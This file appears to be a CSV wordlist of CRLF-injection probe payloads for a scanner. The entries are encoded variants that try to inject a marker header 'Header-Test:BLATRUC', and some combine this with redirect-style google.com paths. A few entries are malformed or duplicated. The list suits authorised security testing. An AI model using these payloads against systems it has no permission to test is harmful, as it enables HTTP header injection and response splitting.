Payloads,Types
%0AHeader-Test:BLATRUC,crlf
%0A%20Header-Test:BLATRUC,crlf
%20%0AHeader-Test:BLATRUC,crlf
%23%OAHeader-Test:BLATRUC,crlf
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,crlf
%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC,crlf
%3F%0AHeader-Test:BLATRUC,crlf
crlf%0AHeader-Test:BLATRUC,crlf
crlf%0A%20Header-Test:BLATRUC,crlf
crlf%20%0AHeader-Test:BLATRUC,crlf
crlf%23%OAHeader-Test:BLATRUC,crlf
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,crlf
crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC,crlf
crlf%3F%0AHeader-Test:BLATRUC,crlf
%0DHeader-Test:BLATRUC,crlf
%0D%20Header-Test:BLATRUC,crlf
%20%0DHeader-Test:BLATRUC,crlf
%23%0DHeader-Test:BLATRUC,crlf
%23%0AHeader-Test:BLATRUC,crlf
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,crlf
%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC,crlf
%3F%0DHeader-Test:BLATRUC,crlf
crlf%0DHeader-Test:BLATRUC,crlf
crlf%0D%20Header-Test:BLATRUC,crlf
crlf%20%0DHeader-Test:BLATRUC,crlf
crlf%23%0DHeader-Test:BLATRUC,crlf
crlf%23%0AHeader-Test:BLATRUC,crlf
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,crlf
crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC,crlf
crlf%3F%0DHeader-Test:BLATRUC,crlf
%0D%0AHeader-Test:BLATRUC,crlf
%0D%0A%20Header-Test:BLATRUC,crlf
%20%0D%0AHeader-Test:BLATRUC,crlf
%23%0D%0AHeader-Test:BLATRUC,crlf
\r\nHeader-Test:BLATRUC,crlf
\r\n Header-Test:BLATRUC,crlf
\r\n Header-Test:BLATRUC,crlf
%5cr%5cnHeader-Test:BLATRUC,crlf
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,crlf
%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC,crlf
%3F%0D%0AHeader-Test:BLATRUC,crlf
crlf%0D%0AHeader-Test:BLATRUC,crlf
crlf%0D%0A%20Header-Test:BLATRUC,crlf
crlf%20%0D%0AHeader-Test:BLATRUC,crlf
crlf%23%0D%0AHeader-Test:BLATRUC,crlf
crlf\r\nHeader-Test:BLATRUC,crlf
crlf%5cr%5cnHeader-Test:BLATRUC,crlf
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC,crlf
crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC,crlf
crlf%3F%0D%0AHeader-Test:BLATRUC,crlf
%0D%0A%09Header-Test:BLATRUC,crlf
crlf%0D%0A%09Header-Test:BLATRUC,crlf
%250AHeader-Test:BLATRUC,crlf
%25250AHeader-Test:BLATRUC,crlf
%%0A0AHeader-Test:BLATRUC,crlf
%25%30AHeader-Test:BLATRUC,crlf
%25%30%61Header-Test:BLATRUC,crlf
%u000AHeader-Test:BLATRUC,crlf
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC,crlf
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC,crlf
/google.com/%2F..%0D%0AHeader-Test:BLATRUC,crlf
